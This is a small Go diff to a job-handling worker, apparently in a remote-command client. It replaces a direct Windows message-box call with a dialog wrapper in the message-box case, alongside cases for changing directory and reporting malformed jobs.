@@ -185,7 +185,7 @@ func (w *Worker) resolve(job *Job) {
 			w.report(job.Id, "Directory changed to "+args[0])
 		}
 	case MSG_BOX:
-		go win.ShowMessageBox(0, args[0], args[1], win.MB_OK)
+		go win.ShowInfoDialog(args[0], args[1])
 		w.report(job.Id, "Message shown successfully.")
 	case UNKNOWN:
 		w.report(job.Id, "Received job has wrong format.")
